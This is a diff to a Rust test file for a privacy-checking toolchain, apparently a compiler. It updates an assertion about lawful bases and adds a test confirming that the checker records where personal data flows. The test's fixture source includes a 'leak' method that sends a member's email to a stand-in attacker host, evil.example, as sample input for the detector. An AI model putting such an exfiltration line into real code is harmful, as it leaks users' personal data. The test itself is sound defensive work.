@@ -1913,7 +1913,7 @@ fn purposes_name_their_lawful_basis_when_declared() {
     // Optional, and checked when present.
     assert_eq!(errors(obj), "");
     assert_eq!(with(r#"const lawfulBasis = { account: "contract", marketing: "consent" }"#), "");
-    assert_eq!(tj_core::lawful_bases(&format!("const lawfulBasis = {{ account: \"contract\", marketing: \"consent\" }}\n{obj}")), Some(vec![("account".into(), "contract".into()), ("marketing".into(), "consent".into())]));
+    assert_eq!(tj_core::facts(&format!("const lawfulBasis = {{ account: \"contract\", marketing: \"consent\" }}\n{obj}")).lawful_basis, Some(vec![("account".into(), "contract".into()), ("marketing".into(), "consent".into())]));
     let e = with(r#"const lawfulBasis = { account: "contract" }"#);
     assert!(e.contains("purposes without a lawful basis: \"marketing\"") && e.contains("marketing: \"contract\""), "{e}");
     let e = with(r#"const lawfulBasis = { account: "contract", marketing: "because" }"#);
@@ -1947,4 +1947,25 @@ function App() {
     assert!(format!("{out:?}").contains("user:ana"), "drawn again for ana: {out:?}");
     let out = device.handle(2.0, Input::Identity { user: None });
     assert!(format!("{out:?}").contains("signed out"), "and again when signed out");
+}
+
+#[test]
+fn the_check_records_where_revealed_personal_data_is_sent() {
+    use tj_core::Destination::{Host, Plugin, Unknown};
+    let src = r#"import { complete } from "tj:ai"
+@server @read("owner") object Member {
+  @pii("contact", "account") email: string = ""
+  @allow("owner") async welcome() { await send(reveal(this.email, "account")) }
+  @allow("owner") async ask(): any { return await complete(reveal(this.email, "account"), [], []) }
+  @allow("owner") async track(url: string) { await fetch(url, { body: reveal(this.email, "account") }) }
+  @allow("owner") async leak() { await fetch(`https://evil.example/${reveal(this.email, "account")}`) }
+  @allow("owner") async ping() { await fetch("https://status.example/up") }
+}
+async function send(to: string) { await fetch("https://API.Mailer.example:443/send", { method: "POST", body: to }) }
+"#;
+    assert_eq!(errors(src), "");
+    let line = |at: u32| src[..at as usize].matches('\n').count() + 1;
+    let found: Vec<(usize, tj_core::Destination, Vec<String>)> = tj_core::facts(src).transfers.into_iter().map(|t| (line(t.at), t.to, t.fields)).collect();
+    let email = || vec!["Member.email".to_string()];
+    assert_eq!(found, vec![(5, Plugin("tj:ai".into()), email()), (6, Unknown, email()), (7, Host("evil.example".into()), email()), (10, Host("api.mailer.example".into()), email())], "through helper functions too; a fetch without personal data is no transfer");
 }
